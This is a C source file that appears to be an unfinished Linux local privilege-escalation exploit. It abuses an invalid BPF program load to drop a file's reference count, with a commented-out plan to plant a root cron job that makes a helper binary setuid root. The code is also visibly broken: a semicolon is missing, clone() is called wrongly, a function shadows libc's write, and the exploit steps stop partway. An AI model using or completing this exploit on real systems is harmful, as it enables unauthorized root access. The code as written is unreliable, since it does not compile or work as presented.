#define _GNU_SOURCE
#include <errno.h>
#include <err.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <linux/bpf.h>


#ifndef __NR_bpf
# if defined(__i386__)
#  define __NR_bpf 357
# elif defined(__x86_64__)
#  define __NR_bpf 321
# elif defined(__aarch64__)
#  define __NR_bpf 280
# else
#  error
# endif
#endif

int map_fd;

int task(void* arg){
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    while (1) sleep(1);
}



void write() {
    char *cwd = get_current_dir_name();
    char buffer[1024];
    // //etc/passwd file we could exploit instead?
    // sprintf(buffer, "* * * * * root /bin/chown root:root '%s'/suidhelper; /bin/chmod 06755 '%s'/suidhelper\n#", cwd, cwd);
}

/* reduces the ref count by 1 per call to this function via the bpf exploit */
void bpf_reduce_refcnt(fd) {
     struct bpf_insn insns[2] = {
        {
            .code = BPF_LD | BPF_IMM | BPF_DW,
            .src_reg = BPF_PSEUDO_MAP_FD,
            .imm = fd
        },
        {}
    };
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insn_cnt = 2,
        .insns = (__aligned_u64) insns,
        .license = (__aligned_u64)""
    };
    int syscallRet = syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
    if (syscallRet != -1) {
        printf("Successfully returned? This shouldn't happen;\
         the call should be invalid, but in a specific way");
    }
    if (errno != EINVAL) {
        printf("Wrong type of invalid bpf program. Got a\
         different error from the one we are trying to exploit");
    }
}

/**
    file A should be  writeable,
    file B should readable
    use file A's writeability & exploit to write to file B
*/
void exploit(char writeable[], char readOnly[]) {
    printf("%s\n", writeable);
    // step 1. open the writeable file
    int fd = open(writeable, O_WRONLY | O_CLOEXEC);
    char child_stack[1000];
    int child = clone(write, child_stack)
    /*
        O_CLOEXEC (since Linux 2.6.23)
        Enable the close-on-exec flag for the new file descriptor.
        Specifying this flag permits a program to avoid additional
        fcntl(2) F_SETFD operations to set the FD_CLOEXEC flag.
        http://man7.org/linux/man-pages/man2/open.2.html

        Note that the use of this flag is essential in some
              multithreaded programs, because using a separate fcntl(2)
              F_SETFD operation to set the FD_CLOEXEC flag does not suffice
              to avoid race conditions where one thread opens a file
              descriptor and attempts to set its close-on-exec flag using
              fcntl(2) at the same time as another thread does a fork(2)
              plus execve(2).
        -- helps avoid race conditions

    */
    printf("%i\n", fd);
    // step 2. reduce the ref count

}

int main(void) {
    char writeable[] = "./tmp/write-only";
    char readOnly[] = "./tmp/read-only";
    exploit(writeable, readOnly);
    // map_fd = open("readonly", O_RDONLY);
    // char child_stack[20000];
	// int child = clone(task, child_stack + sizeof(child_stack), CLONE_FILES | SIGCHLD, NULL);

    // struct bpf_insn insns[2] = {
    // {
    //     .code = BPF_LD | BPF_IMM | BPF_DW,
    //     .src_reg = BPF_PSEUDO_MAP_FD,
    //     .imm = map_fd
    // },
    // {
    // }
    // };
    // union bpf_attr attr = {
    //     .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    //     .insn_cnt = 2,
    //     .insns = (__aligned_u64) insns,
    //     .license = (__aligned_u64)""
    // };
    // syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
    // int dummy_fd = open("writeonly", O_WRONLY);
    // const void *buf[10];
    // read(map_fd, buf, 1);
}
